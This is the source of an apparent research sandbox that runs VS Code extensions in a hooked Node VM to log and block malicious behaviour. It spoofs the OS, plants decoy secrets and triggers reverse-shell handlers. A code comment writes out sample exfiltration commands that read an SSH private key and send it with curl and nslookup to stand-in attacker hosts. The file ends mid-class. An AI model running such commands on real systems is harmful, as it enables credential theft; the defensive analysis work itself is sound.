#!/usr/bin/env node
/**
 * sandbox.js — Dynamic Analysis Sandbox for VS Code Extensions
 * =============================================================
 * Executes a VS Code extension in an isolated Node.js VM context with
 * monkey-patched system APIs to capture every malicious action the
 * extension attempts at runtime.
 *
 * Architecture:
 *   1. API Hooking Layer   — intercepts child_process, http/https, fs,
 *                            net, dns, and global eval BEFORE execution
 *   2. Require Cache Patch — injects hooks into Node's module cache so
 *                            even transitive dependencies use hooked modules
 *   3. VM Context          — runs extension code in vm.createContext() with
 *                            a custom require that returns hooked modules
 *   4. Activation          — finds and calls the export.activate() function
 *   5. Async Wait          — waits 8 s for timers / Promises to settle
 *   6. JSON Report         — writes execution-log.json to the extension dir
 *
 * Usage:
 *   node sandbox.js <path-to-unpacked-extension-directory>
 *
 * The directory must contain a package.json with a "main" field pointing
 * to the extension's entry point JavaScript file.
 *
 * Project: CSN 304 — "Towards Identifying Malicious VS Code Extensions"
 */

'use strict';

const vm     = require('vm');
const path   = require('path');
const fs     = require('fs');
const os     = require('os');
const Module = require('module');
const { EventEmitter } = require('events');
const DI     = require('./data-intel');   // sensitive-data classifier + exfil taint
const { TimeMachine } = require('./time-machine');   // virtual-clock fast-forward engine
const { installToStringGuard, spoofModuleFunctions, spoofNativeToString } = require('./native-spoof'); // anti-analysis toString() cloaking
const DECOY  = require('./decoy-profile'); // synthetic victim profile (honeypot secrets)
const { extractVsix } = require('./zip-util'); // dependency-free .vsix unpacking

// Per-run Time Machine handle, shared with recordBeacon() (network-latency
// injection) and writeReport() (virtual-clock stats). Assigned in runSandbox().
let TIME_MACHINE = null;


// ─────────────────────────────────────────────────────────────────────────────
//  SECTION 0 — Runtime configuration (environment-overridable)
// ─────────────────────────────────────────────────────────────────────────────
//  Many extension payloads are GATED on the host operating system. They check
//  `process.platform` or `os.platform()` and silently `return` on any platform
//  that is not their intended target (almost always Windows). On the Ubuntu
//  analysis VM these samples therefore do *nothing* and look benign.
//
//  To defeat OS gating we present the extension with a spoofed platform/arch.
//  Default = win32/x64 (the most-targeted platform). Override per-run, e.g.:
//      SANDBOX_OS=darwin SANDBOX_ARCH=arm64 node sandbox.js <dir>
//
//  NOTE: there is deliberately no passive wait knob any more. v2 idled for
//  SANDBOX_WAIT_MS (30 s) after activation hoping a timer-based beacon would
//  fire inside the window — which is precisely the bet malware wins by sleeping
//  longer. Detonation of delayed payloads is now the Time Machine's job: the
//  virtual clock is fast-forwarded to each scheduled deadline up to a 366-day
//  horizon, so a 30-day sleep resolves in microseconds of real time and nothing
//  is left to chance. The constant and its env var were dead by v2.2 (read only
//  by a console banner); they are removed here so nobody re-introduces a
//  wall-clock wait believing it still does something.
// ─────────────────────────────────────────────────────────────────────────────

const SPOOF_PLATFORM = process.env.SANDBOX_OS   || 'win32';
const SPOOF_ARCH     = process.env.SANDBOX_ARCH || 'x64';

// ── Batch mode ───────────────────────────────────────────────────────────────
//  Between simulated editor events and command invocations the harness settles
//  the REAL event loop so promises resolve. At 500–1000 ms a settle, a single
//  sample can idle for well over a minute — multiply by 3 800 VsMex samples and
//  a full corpus run stops being feasible. SANDBOX_FAST collapses those settles
//  to a few milliseconds. It is safe because *delayed* behaviour is handled by
//  the Time Machine (virtual clock), not by real waiting; the settle only needs
//  to be long enough to drain microtasks and one macrotask phase.
const FAST      = process.env.SANDBOX_FAST === '1';
const SETTLE_MS = FAST ? 5 : 500;
const CMD_MS    = FAST ? 10 : 1000;
const settle    = (ms) => new Promise((r) => setTimeout(r, ms));

// The synthetic victim profile (bait secrets). Created in runSandbox().
let DECOY_PROFILE = null;

// Guard rails so a heavyweight extension cannot exhaust memory/CPU and get the
// whole process OOM-killed before the report is written. Some legitimate-looking
// samples (e.g. an Ethereum wallet extension) run real scrypt key-derivation on
// every "create account" command; brute-forcing such commands hundreds of times
// allocates enormous native buffers. We cap both stored events and the number of
// command invocations the simulator performs.
const MAX_EVENTS   = Number(process.env.SANDBOX_MAX_EVENTS) > 0 ? Number(process.env.SANDBOX_MAX_EVENTS) : 4000;
const MAX_CMD_EXEC = Number(process.env.SANDBOX_MAX_CMDS)   > 0 ? Number(process.env.SANDBOX_MAX_CMDS)   : 60;
let   CMD_EXEC_COUNT = 0;

// Malware run inside the VM frequently throws (incomplete mock env) or rejects
// promises asynchronously. Those must NOT abort the harness before the report is
// written, so we swallow them after logging. Detection continues regardless.
process.on('uncaughtException',  (e) => { try { process.stderr.write(`  [SANDBOX] swallowed uncaughtException: ${e && e.message}\n`); } catch (_) {} });
process.on('unhandledRejection', (e) => { try { process.stderr.write(`  [SANDBOX] swallowed unhandledRejection: ${e && (e.message || e)}\n`); } catch (_) {} });


// ─────────────────────────────────────────────────────────────────────────────
//  SECTION 1 — Central Event Logger
// ─────────────────────────────────────────────────────────────────────────────

const LOG_EVENTS  = [];   // All intercepted events accumulate here
const START_TIME  = Date.now();

// Second-stage payload analysis: when an extension forks/spawns a local Node
// script (a common way to hide the real payload), we run that script inside the
// SAME instrumented context instead of just blocking it. These are set up once
// the VM context exists (see buildVmContext).
let   secondStageRunner = null;
const SECOND_STAGE_SEEN = new Set();
const SECOND_STAGE_MAX  = 4;
let   secondStageActive = 0;

/**
 * logEvent — records a single intercepted API call.
 *
 * @param {string} module         e.g. 'child_process', 'https', 'eval'
 * @param {string} functionHooked e.g. 'exec', 'request'
 * @param {Object} args           key/value pairs describing the call
 * @param {string} [severity]     'INFO' | 'WARN' | 'CRITICAL'
 */
function logEvent(module, functionHooked, args = {}, severity = 'WARN') {
  // Memory guard: once we have plenty of evidence, stop accumulating events so a
  // runaway extension cannot OOM the process before the report is written.
  if (LOG_EVENTS.length >= MAX_EVENTS) return;
  const event = {
    id:              LOG_EVENTS.length + 1,
    timestamp:       new Date().toISOString(),
    elapsed_ms:      Date.now() - START_TIME,
    severity,
    module,
    function_hooked: functionHooked,
    arguments:       sanitize(args),
  };
  LOG_EVENTS.push(event);

  // Live console output during execution
  const preview = JSON.stringify(args).slice(0, 140);
  const icon    = severity === 'CRITICAL' ? '🔴' : severity === 'WARN' ? '🟡' : '🔵';
  process.stdout.write(`  ${icon} [HOOK] ${module}.${functionHooked}() → ${preview}\n`);
}

/** Truncate long strings so the log file stays manageable */
function sanitize(args) {
  const out = {};
  for (const [k, v] of Object.entries(args)) {
    if (typeof v === 'string')       out[k] = v.length > 600 ? v.slice(0, 600) + '…[truncated]' : v;
    else if (Buffer.isBuffer(v))     out[k] = `Buffer(${v.length} bytes)`;
    else if (typeof v === 'function')out[k] = '[Function]';
    else if (Array.isArray(v))       out[k] = v.map(x => typeof x === 'string' ? x.slice(0, 200) : x).slice(0, 20);
    else                             out[k] = v;
  }
  return out;
}


// ─────────────────────────────────────────────────────────────────────────────
//  SECTION 1b — Outbound Message (C2 Beacon) Recorder
//  Requirement (supervisor): "log the message the malware sends out — what is
//  in it." Every transport hook (http/https body, http GET url, fetch body,
//  raw TCP write, axios payload, DNS exfil) funnels here so the report contains
//  the full content of each outbound transmission, not just its destination.
// ─────────────────────────────────────────────────────────────────────────────

const BEACONS = [];   // structured record of everything the extension transmits

/** Best-effort: surface human-readable text hidden inside an encoded payload. */
function decodeBeaconBody(body) {
  try {
    const layers = DI.decodeLayers(String(body || ''));
    // layers[0] is the original; return the first *different* decoded layer
    const decoded = layers.find((l, i) => i > 0 && l && l !== layers[0]);
    return decoded ? decoded.slice(0, 800) : '';
  } catch (e) { return ''; }
}

/**
 * recordBeacon — capture a single outbound transmission.
 * @param {Object} info  { transport, destination, host, method, headers, body }
 */
function recordBeacon(info) {
  // Advance the virtual clock by a realistic RTT so a specimen that times its
  // own network calls (Date.now() before/after) sees a plausible delta instead
  // of the tell-tale ~0 ms of a fully-mocked transport.
  if (TIME_MACHINE) TIME_MACHINE.injectNetworkLatency();
  const bodyStr = info.body == null ? ''
    : (Buffer.isBuffer(info.body) ? info.body.toString('utf8') : String(info.body));
  const rec = {
    seq:         BEACONS.length + 1,
    elapsed_ms:  Date.now() - START_TIME,
    transport:   info.transport || 'unknown',          // http | https | fetch | tcp | axios | dns
    destination: String(info.destination || info.host || 'unknown'),
    host:        info.host ? String(info.host) : (() => { try { return new URL(info.destination).host; } catch { return ''; } })(),
    method:      info.method || '',
    headers:     info.headers && typeof info.headers === 'object'
                   ? Object.fromEntries(Object.entries(info.headers).map(([k, v]) => [k, String(v).slice(0, 200)]))
                   : undefined,
    body:        bodyStr.length > 2000 ? bodyStr.slice(0, 2000) + '…[truncated]' : bodyStr,
    body_bytes:  bodyStr.length,
    decoded:     decodeBeaconBody(bodyStr),            // plaintext recovered from base64/url/hex, if any
  };
  BEACONS.push(rec);

  // Emit a dedicated, eye-catching log line so the analyst sees the message live.
  const dest = rec.host || rec.destination;
  process.stdout.write(`  📤 [MSG-OUT] ${rec.transport.toUpperCase()} ${rec.method} ${dest}\n`);
  if (rec.body)    process.stdout.write(`       body: ${rec.body.slice(0, 200)}\n`);
  if (rec.decoded) process.stdout.write(`       decoded: ${rec.decoded.slice(0, 200)}\n`);

  // Also record it as a first-class CRITICAL event for the timeline/summary.
  logEvent('network', 'message_sent', {
    transport:   rec.transport,
    destination: rec.destination,
    method:      rec.method,
    body_preview: rec.body,
    decoded_preview: rec.decoded || undefined,
  }, 'CRITICAL');
}


// ─────────────────────────────────────────────────────────────────────────────
//  SECTION 2 — child_process Hook
//  Blocks ALL execution. Logs command + arguments as evidence.
// ─────────────────────────────────────────────────────────────────────────────

function createChildProcessHook() {
  /** Returns a mock ChildProcess EventEmitter with stdout/stderr streams */
  function mockProcess() {
    const proc   = new EventEmitter();
    proc.stdout  = Object.assign(new EventEmitter(), { pipe: () => proc.stdout, setEncoding: () => {} });
    proc.stderr  = Object.assign(new EventEmitter(), { pipe: () => proc.stderr, setEncoding: () => {} });
    proc.stdin   = { write: () => true, end: () => {}, on: () => {}, destroy: () => {} };
    proc.pid     = 99999;
    proc.killed  = false;
    proc.exitCode = 0;
    proc.kill    = () => { proc.killed = true; };
    proc.unref   = () => {};
    proc.ref     = () => {};
    // Emit exit events after a microtask so handlers can register first
    setImmediate(() => {
      proc.stdout.emit('data', Buffer.from(''));
      proc.stderr.emit('data', Buffer.from(''));
      proc.emit('close',  0, null);
      proc.emit('exit',   0, null);
    });
    return proc;
  }

  /** Detect `node <script.js>` in exec/spawn commands and analyze that script */
  function secondStageFromCommand(cmd, args) {
    if (!secondStageRunner) return;
    try {
      let target = null;
      const c = String(cmd || '');
      if (Array.isArray(args) && /(^|[\/\\])node(\.exe)?$/.test(c)) {
        target = args.find(a => /\.[cm]?js$/.test(String(a)));
      }
      if (!target) {
        const m = c.match(/\bnode(?:\.exe)?\s+(?:--[^\s]+\s+)*["']?([^\s"']+\.[cm]?js)/);
        if (m) target = m[1];
      }
      if (target) secondStageRunner(String(target));
    } catch (e) {}
  }

  /**
   * TAINT SINK — a command line is an exfiltration channel.
   *
   * The taint layer was wired to http/https/fetch/net/dns only, so a payload
   * that ships a stolen secret *through a process argument* left no trace:
   *
   *     const key = fs.readFileSync(`${os.homedir()}/.ssh/id_rsa`);
   *     cp.exec(`curl -X POST -d "${key}" https://evil.tld/c2`);
   *     cp.exec(`nslookup ${b64(key)}.exfil.attacker.tld`);
   *
   * Both read the secret and both send it, but neither touched a network hook —
   * the child_process hook blocks the command, so the request never reaches
   * http/dns. The read→send loop could never close and the sample scored as
   * "spawns a process" instead of "exfiltrates credentials".
   *
   * Every command string, argument vector and env override now passes through
   * scanExfil, so a shell invocation carrying tainted bytes closes the loop
   * exactly like an HTTP body does.
   */
  function scanCommandForExfil(fn, cmd, args, opts) {
    try {
      const parts = [String(cmd || '')];
      if (Array.isArray(args)) parts.push(args.map(String).join(' '));
      else if (args && typeof args === 'object' && !Array.isArray(args)) {
        // execFile(file, opts, cb) — `args` is really the options bag.
        opts = opts || args;
      }
      // Secrets are also smuggled via the child's environment.
      if (opts && typeof opts === 'object' && opts.env && typeof opts.env === 'object') {
        for (const [k, v] of Object.entries(opts.env)) {
          if (typeof v === 'string' && v.length >= 12) parts.push(`${k}=${v}`);
        }
      }
      const payload = parts.filter(Boolean).join(' ');
      if (payload.length >= 12) {
        // Destination = the remote host named on the command line if there is
        // one, otherwise the executable itself.
        const url  = payload.match(/https?:\/\/[^\s"'`|;)]+/);
        const host = payload.match(/\b(?:[a-z0-9-]+\.)+[a-z]{2,}\b/i);
        const dest = url ? url[0] : `shell:${String(cmd || '').slice(0, 60)}${host ? ' → ' + host[0] : ''}`;
        DI.scanExfil(dest, payload, logEvent);
      }
    } catch (e) { /* never let sink inspection break the hook */ }
  }

  return {
    exec(cmd, opts, cb) {
      logEvent('child_process', 'exec', { command: String(cmd) }, 'CRITICAL');
      if (typeof opts === 'function') { cb = opts; opts = {}; }
      scanCommandForExfil('exec', cmd, null, opts);
      secondStageFromCommand(cmd);
      if (typeof cb === 'function') setImmediate(() => cb(null, '', ''));
      return mockProcess();
    },
    execSync(cmd, opts) {
      logEvent('child_process', 'execSync', { command: String(cmd) }, 'CRITICAL');
      scanCommandForExfil('execSync', cmd, null, opts);
      secondStageFromCommand(cmd);
      return Buffer.from('');
    },
    spawn(cmd, args, opts) {
      logEvent('child_process', 'spawn', { command: String(cmd), args: Array.isArray(args) ? args.join(' ') : '' }, 'CRITICAL');
      scanCommandForExfil('spawn', cmd, args, opts);
      secondStageFromCommand(cmd, args);
      return mockProcess();
    },
    spawnSync(cmd, args, opts) {
      logEvent('child_process', 'spawnSync', { command: String(cmd), args: Array.isArray(args) ? args.join(' ') : '' }, 'CRITICAL');
      scanCommandForExfil('spawnSync', cmd, args, opts);
      secondStageFromCommand(cmd, args);
      return { pid:99999, output:[null, Buffer.from(''), Buffer.from('')], stdout:Buffer.from(''), stderr:Buffer.from(''), status:0, signal:null, error:undefined };
    },
    execFile(file, args, opts, cb) {
      logEvent('child_process', 'execFile', { file: String(file), args: Array.isArray(args) ? args.join(' ') : '' }, 'CRITICAL');
      scanCommandForExfil('execFile', file, Array.isArray(args) ? args : null, opts);
      secondStageFromCommand(file, args);
      if (typeof args === 'function') cb = args;
      else if (typeof opts === 'function') cb = opts;
      if (typeof cb === 'function') setImmediate(() => cb(null, '', ''));
      return mockProcess();
    },
    fork(modulePath, args, opts) {
      logEvent('child_process', 'fork', { modulePath: String(modulePath), args: Array.isArray(args) ? args.join(' ') : '' }, 'CRITICAL');
      scanCommandForExfil('fork', modulePath, Array.isArray(args) ? args : null, opts);
      if (secondStageRunner) { try { secondStageRunner(String(modulePath)); } catch (e) {} }
      return mockProcess();
    },
  };
}


// ─────────────────────────────────────────────────────────────────────────────
//  SECTION 3 — HTTP / HTTPS Hook
//  Blocks outbound connections. Returns empty mock responses. Logs URL + method.
// ─────────────────────────────────────────────────────────────────────────────

function createHttpHook(protocol) {
  const realModule = require(protocol);  // keep real module for non-request exports

  /** Build a fake IncomingMessage (response) */
  function mockResponse() {
    const res       = new EventEmitter();
    res.statusCode  = 200;
    res.statusMessage = 'OK';
    res.headers     = { 'content-type': 'application/json' };
    res.rawHeaders  = [];
    res.setEncoding = () => {};
    res.resume      = () => {};
    res.destroy     = () => {};
    // Some droppers do `response.pipe(fileStream)` then wait for 'finish'. Provide
    // a pipe that drives the destination to completion so their promise resolves
    // (and the chain that follows the download — often a spawn — also executes).
    res.pipe        = (dest) => {
      setImmediate(() => {
        try { if (dest && typeof dest.emit === 'function') { dest.emit('data', Buffer.from('')); dest.emit('finish'); dest.emit('close'); } } catch (e) {}
      });
      return dest;
    };
    setImmediate(() => {
      res.emit('data', Buffer.from('{}'));
      res.emit('end');
    });
    return res;
  }

  /** Build a fake ClientRequest that captures the outbound body */
  function mockRequest(callback, destination, meta = {}) {
    const req       = new EventEmitter();
    const chunks    = [];
    let   ended     = false;
    const collect   = (c) => { if (c != null) chunks.push(Buffer.isBuffer(c) ? c : Buffer.from(String(c))); };
    const scanBody  = () => {
      if (ended) return;          // a request may call end() more than once
      ended = true;
      const body = Buffer.concat(chunks).toString('utf8');
      // Capture the full outbound message (destination + headers + body content)
      recordBeacon({ transport: protocol, destination, host: meta.host, method: meta.method || 'GET', headers: meta.headers, body });
      try { DI.scanExfil(destination, body, logEvent); } catch (e) {}
    };
    req.writable    = true;
    req.write       = (chunk) => { collect(chunk); return true; };
    req.end         = (chunk) => {
      collect(chunk);
      scanBody();
      if (typeof callback === 'function') setImmediate(() => { try { callback(mockResponse()); } catch (e) {} });
      req.emit('finish');
    };
    req.abort       = () => {};
    req.destroy     = () => {};
    req.setTimeout  = () => req;
    req.setHeader   = () => {};
    req.getHeader   = () => undefined;
    req.removeHeader= () => {};
    req.flushHeaders= () => {};
    req.socket      = { remoteAddress: '127.0.0.1', encrypted: protocol === 'https' };
    return req;
  }

  /** Extract a human-readable URL string from request options */
  function extractUrl(options) {
    if (typeof options === 'string') return options;
    if (options && typeof options.href === 'string') return options.href;
    if (options instanceof URL) return options.toString();
    const proto = options.protocol || (protocol + ':');
    const host  = options.hostname || options.host || 'unknown';
    const port  = options.port ? `:${options.port}` : '';
    const p     = options.path || '/';
    return `${proto}//${host}${port}${p}`;
  }

  /** Node allows request(url, options, cb) and get(url, options, cb). Merge them. */
  function normalizeArgs(options, maybeOpts, maybeCb) {
    let opts = options, cb = maybeCb;
    if (typeof maybeOpts === 'function') { cb = maybeOpts; }
    else if (maybeOpts && typeof maybeOpts === 'object') {
      // (url|URL, optionsObject, cb) form — merge so headers/method are kept
      const base = (typeof options === 'string' || options instanceof URL)
        ? { href: String(options) } : (options || {});
      opts = Object.assign({}, base, maybeOpts);
      if (typeof options === 'string') { try { Object.assign(opts, pickUrlParts(options)); } catch (e) {} }
    }
    return { opts, cb };
  }
  function pickUrlParts(u) {
    const x = new URL(u);
    return { protocol: x.protocol, hostname: x.hostname, host: x.host, port: x.port, path: x.pathname + x.search, href: u };
  }
  function metaOf(options) {
    return {
      method:  (options && typeof options === 'object' && options.method) ? options.method : 'GET',
      host:    (options && (options.hostname || options.host)) || '',
      headers: (options && typeof options === 'object' && options.headers) || undefined,
    };
  }

  return Object.assign({}, realModule, {
    request(options, maybeOpts, maybeCb) {
      const { opts, cb } = normalizeArgs(options, maybeOpts, maybeCb);
      const url    = extractUrl(opts);
      const meta   = metaOf(opts);
      logEvent(protocol, 'request', { url, method: meta.method, host: meta.host }, 'CRITICAL');
      try { DI.scanExfil(url, url, logEvent); } catch (e) {}   // query-string exfil
      return mockRequest(cb, url, meta);
    },
    get(options, maybeOpts, maybeCb) {
      const { opts, cb } = normalizeArgs(options, maybeOpts, maybeCb);
      const url  = extractUrl(opts);
      const meta = metaOf(opts); meta.method = 'GET';
      logEvent(protocol, 'get', { url, method: 'GET', host: meta.host }, 'CRITICAL');
      try { DI.scanExfil(url, url, logEvent); } catch (e) {}   // query-string exfil
      const req = mockRequest(cb, url, meta);
      setImmediate(() => req.end());
      return req;
    },
  });
}


// ─────────────────────────────────────────────────────────────────────────────
//  SECTION 4 — fs Hook
//  READS are allowed (extensions need to read their own files).
//  WRITES are BLOCKED (prevent malware from persisting to the host FS).
//  All access is logged.
// ─────────────────────────────────────────────────────────────────────────────

/**
 * Is this fs.open()/fs.promises.open() `flags` argument read-only?
 * Fails CLOSED: anything not recognisably a pure-read mode (an unfamiliar
 * shape, a numeric flag combination we can't classify) is treated as
 * write-intent and blocked, rather than passed through to the real fs.
 */
function isReadOnlyFsFlags(flags) {
  if (flags == null) return true; // Node defaults fs.open's flags to 'r'
  if (typeof flags === 'string') return /^(r|rs|sr)$/i.test(flags);
  if (typeof flags === 'number') {
    const c = require('fs').constants || {};
    const writeBits = (c.O_WRONLY || 1) | (c.O_RDWR || 2) | (c.O_CREAT || 0x40) | (c.O_TRUNC || 0x200) | (c.O_APPEND || 0x400);
    return (flags & writeBits) === 0;
  }
  return false;
}

/**
 * A fake fs.WriteStream: same shape as createWriteStream()'s return value,
 * but as an actual class so `new (require('fs').WriteStream)(path)` — which
 * bypasses the createWriteStream() factory hook entirely — is ALSO
 * contained, instead of leaking the real class through Object.assign.
 */
class FakeWriteStream extends EventEmitter {
  constructor(filePath) {
    super();
    logEvent('fs', 'WriteStream', { path: String(filePath) }, 'CRITICAL');
    this.path = filePath; this.writable = true; this.bytesWritten = 0;
    setImmediate(() => this.emit('open', -1));
  }
  write(data, enc, cb) { if (typeof enc === 'function') cb = enc; if (typeof cb === 'function') cb(); return true; }
  end(data, enc, cb) {
    if (typeof data === 'function') cb = data; else if (typeof enc === 'function') cb = enc;
    if (typeof cb === 'function') cb();
    setImmediate(() => this.emit('finish'));
  }
  destroy() { return this; }
  close(cb) { if (typeof cb === 'function') cb(); }
}

function createFsHook() {
  const real = require('fs');

  function previewData(data) {
    const str = Buffer.isBuffer(data) ? data.toString('utf8', 0, 400) : String(data).slice(0, 400);
    return str;
  }

  // Low-level fd write path (open+write / open+writeSync): opening a file
  // with write/append/create/truncate intent is refused up front — a FAKE
  // fd is handed back instead of ever touching the real file — while a
  // genuinely read-only open still reaches the real fs (taint-source reads
  // must keep working). write()/writeSync() are ALSO unconditionally
  // no-op'd regardless of which fd they're called with, as defense in depth.
  const fakeFds = new Set();
  let fakeFdCounter = 1e9;

  const hooked = Object.assign({}, real, {
    // ── Low-level fd write path — BLOCKED for write-intent opens ──────────
    open(filePath, flags, mode, cb) {
      if (typeof flags === 'function') { cb = flags; flags = 'r'; mode = undefined; }
      else if (typeof mode === 'function') { cb = mode; mode = undefined; }
      if (isReadOnlyFsFlags(flags)) return real.open(filePath, flags, mode, cb);
      logEvent('fs', 'open', { path: String(filePath), flags: String(flags) }, 'CRITICAL');
      const fd = fakeFdCounter++; fakeFds.add(fd);
      if (typeof cb === 'function') setImmediate(() => cb(null, fd));
    },
    openSync(filePath, flags, mode) {
      if (isReadOnlyFsFlags(flags)) return real.openSync(filePath, flags, mode);
      logEvent('fs', 'openSync', { path: String(filePath), flags: String(flags) }, 'CRITICAL');
      const fd = fakeFdCounter++; fakeFds.add(fd);
      return fd;
    },
    write(fd, ...args) {
      logEvent('fs', 'write', { fd }, 'CRITICAL');
      const cb = args.find((a) => typeof a === 'function');
      if (cb) setImmediate(() => cb(null, 0, Buffer.alloc(0)));
    },
    writeSync(fd) {
      logEvent('fs', 'writeSync', { fd }, 'CRITICAL');
      return 0;
    },
    close(fd, cb) {
      if (fakeFds.has(fd)) { fakeFds.delete(fd); if (typeof cb === 'function') setImmediate(() => cb(null)); return; }
      return real.close(fd, cb);
    },
    closeSync(fd) {
      if (fakeFds.has(fd)) { fakeFds.delete(fd); return; }
      return real.closeSync(fd);
    },
    WriteStream: FakeWriteStream,
    // ── Write operations — BLOCKED ────────────────────────────────────────
    writeFile(filePath, data, opts, cb) {
      logEvent('fs', 'writeFile', { path: String(filePath), data_preview: previewData(data), bytes: Buffer.isBuffer(data) ? data.length : String(data).length }, 'CRITICAL');
      if (typeof opts === 'function') { cb = opts; }
      if (typeof cb === 'function') setImmediate(() => cb(null));
    },
    writeFileSync(filePath, data, opts) {
      logEvent('fs', 'writeFileSync', { path: String(filePath), data_preview: previewData(data), bytes: Buffer.isBuffer(data) ? data.length : String(data).length }, 'CRITICAL');
      // Blocked — no actual write
    },
    appendFile(filePath, data, opts, cb) {
      logEvent('fs', 'appendFile', { path: String(filePath), data_preview: previewData(data) }, 'WARN');
      if (typeof opts === 'function') { cb = opts; }
      if (typeof cb === 'function') setImmediate(() => cb(null));
    },
    appendFileSync(filePath, data, opts) {
      logEvent('fs', 'appendFileSync', { path: String(filePath), data_preview: previewData(data) }, 'WARN');
    },
    unlink(filePath, cb) {
      logEvent('fs', 'unlink', { path: String(filePath) }, 'WARN');
      if (typeof cb === 'function') setImmediate(() => cb(null));
    },
    unlinkSync(filePath) {
      logEvent('fs', 'unlinkSync', { path: String(filePath) }, 'WARN');
    },
    rename(oldPath, newPath, cb) {
      logEvent('fs', 'rename', { old_path: String(oldPath), new_path: String(newPath) }, 'WARN');
      if (typeof cb === 'function') setImmediate(() => cb(null));
    },
    renameSync(oldPath, newPath) {
      logEvent('fs', 'renameSync', { old_path: String(oldPath), new_path: String(newPath) }, 'WARN');
    },
    mkdir(dirPath, opts, cb) {
      logEvent('fs', 'mkdir', { path: String(dirPath) }, 'INFO');
      if (typeof opts === 'function') { cb = opts; }
      if (typeof cb === 'function') setImmediate(() => cb(null));
    },
    mkdirSync(dirPath, opts) {
      logEvent('fs', 'mkdirSync', { path: String(dirPath) }, 'INFO');
    },
    createWriteStream(filePath, opts) {
      // Same FakeWriteStream class as the WriteStream override above, so
      // both entry points (factory function and `new fs.WriteStream(...)`)
      // are contained identically instead of diverging.
      return new FakeWriteStream(filePath);
    },

    // ── Read operations — ALLOWED but logged + CLASSIFIED ─────────────────
    readFile(filePath, opts, cb) {
      logEvent('fs', 'readFile', { path: String(filePath) }, 'INFO');
      const realCb   = typeof opts === 'function' ? opts : cb;
      const realOpts = typeof opts === 'function' ? undefined : opts;
      DI.noteRead(String(filePath), undefined, logEvent);   // path-based signal
      return real.readFile(filePath, realOpts, (err, data) => {
        if (!err) { try { DI.noteRead(String(filePath), data, logEvent); } catch (e) {} }
        if (typeof realCb === 'function') realCb(err, data);
      });
    },
    readFileSync(filePath, opts) {
      logEvent('fs', 'readFileSync', { path: String(filePath) }, 'INFO');
      const data = real.readFileSync(filePath, opts);
      try { DI.noteRead(String(filePath), data, logEvent); } catch (e) {}
      return data;
    },
  });

  // BUG FIX: `Object.assign({}, real, {...})` above copies `real.promises`
  // (the actual, unhooked fs.promises API) onto the hooked object verbatim,
  // since `promises` wasn't in the override list — every write through
  // `require('fs').promises.*` reached the real filesystem. Replace it with
  // the same hardened promises implementation used for `require('fs/promises')`,
  // so both entry points are contained identically (single source of truth).
  hooked.promises = createFsPromisesHook(hooked);
  return hooked;
}


// ─────────────────────────────────────────────────────────────────────────────
//  SECTION 5 — os Hook  (log sensitive reconnaissance calls)
// ─────────────────────────────────────────────────────────────────────────────

function createOsHook() {
  const realOs = require('os');
  // Every identity-bearing readout is answered from the DECOY profile, never
  // from the analyst's real machine. This does two jobs at once: a stealer
  // walking the home directory finds bait it can actually steal (closing the
  // taint loop), and the analyst's genuine keys are never in reach.
  const home = () => (DECOY_PROFILE ? DECOY_PROFILE.home : realOs.homedir());
  return Object.assign({}, realOs, {
    homedir() {
      logEvent('os', 'homedir', { result: home() }, 'WARN');
      return home();
    },
    userInfo(opts) {
      logEvent('os', 'userInfo', {}, 'WARN');
      const u = DECOY_PROFILE ? DECOY_PROFILE.userName : 'user';
      return { uid: -1, gid: -1, username: u, homedir: home(), shell: null };
    },
    hostname() {
      const h = (DECOY_PROFILE && DECOY_PROFILE.env.COMPUTERNAME) || realOs.hostname();
      logEvent('os', 'hostname', { result: h }, 'INFO');
      return h;
    },
    networkInterfaces() {
      logEvent('os', 'networkInterfaces', {}, 'WARN');
      // A stable decoy MAC: real malware exfiltrates it as a host fingerprint,
      // and a fixed value makes that flow provable in the report.
      return {
        Ethernet: [{ address: '192.168.1.47', netmask: '255.255.255.0', family: 'IPv4',
                     mac: 'de:c0:00:11:22:33', internal: false, cidr: '192.168.1.47/24' }],
        'Loopback Pseudo-Interface 1': [{ address: '127.0.0.1', netmask: '255.0.0.0', family: 'IPv4',
                     mac: '00:00:00:00:00:00', internal: true, cidr: '127.0.0.1/8' }],
      };
    },
    cpus() { return realOs.cpus(); },
    // OS-gate defeat: report the spoofed (targeted) platform so payloads that
    // bail out on the analysis VM's real OS (e.g. `if (os.platform()!=='win32') return`)
    // proceed down their malicious branch instead.
    platform() { return SPOOF_PLATFORM; },
    release() { return SPOOF_PLATFORM === 'win32' ? '10.0.19045' : realOs.release(); },
    arch() { return SPOOF_ARCH; },
    type() { return SPOOF_PLATFORM === 'win32' ? 'Windows_NT' : (SPOOF_PLATFORM === 'darwin' ? 'Darwin' : realOs.type()); },
    tmpdir() { return DECOY_PROFILE ? DECOY_PROFILE.env.TEMP : realOs.tmpdir(); },
    freemem() { return realOs.freemem(); },
    totalmem() { return realOs.totalmem(); },
    uptime() { return realOs.uptime(); },
    EOL: realOs.EOL,
  });
}


// ─────────────────────────────────────────────────────────────────────────────
//  SECTION 6 — net Hook  (raw TCP socket interception)
// ─────────────────────────────────────────────────────────────────────────────

function createNetHook() {
  const realNet = require('net');

  class MockSocket extends EventEmitter {
    constructor() {
      super();
      this.writable = true; this.readable = true; this.connecting = false;
      this.destroyed = false; this.localAddress = '127.0.0.1'; this.remoteAddress = '0.0.0.0';
    }
    connect(port, host, cb) {
      this._dest = `${String(host || 'localhost')}:${String(port)}`;
      logEvent('net', 'Socket.connect', { host: String(host || 'localhost'), port: String(port) }, 'CRITICAL');
      if (typeof cb === 'function') setImmediate(cb);
      setImmediate(() => { this.emit('connect'); this.emit('ready'); });
      // Reverse shells run `socket.on('data', d => child_process.exec(d))`. Feed
      // the socket a probe command so that handler fires and the exec() — the
      // real malicious act — is captured instead of waiting for a live C2.
      setImmediate(() => { try { this.emit('data', Buffer.from('whoami\n')); } catch (e) {} });
      return this;
    }
    write(data, enc, cb)   { if (data != null) this._buf = (this._buf || '') + (Buffer.isBuffer(data) ? data.toString('utf8') : String(data)); if (typeof cb === 'function') cb(); return true; }
    end(data, enc, cb)     {
      if (data != null) this._buf = (this._buf || '') + (Buffer.isBuffer(data) ? data.toString('utf8') : String(data));
      if (this._buf) {
        recordBeacon({ transport: 'tcp', destination: this._dest || 'tcp', host: this._dest, method: 'TCP', body: this._buf });
        try { DI.scanExfil(this._dest || 'tcp', this._buf, logEvent); } catch (e) {}
      }
      if (typeof cb === 'function') cb(); setImmediate(() => { this.emit('close'); });
    }
    destroy()              { this.destroyed = true; setImmediate(() => this.emit('close')); }
    setTimeout(ms, cb)     { return this; }
    setEncoding(enc)       { return this; }
    setKeepAlive(b, init)  { return this; }
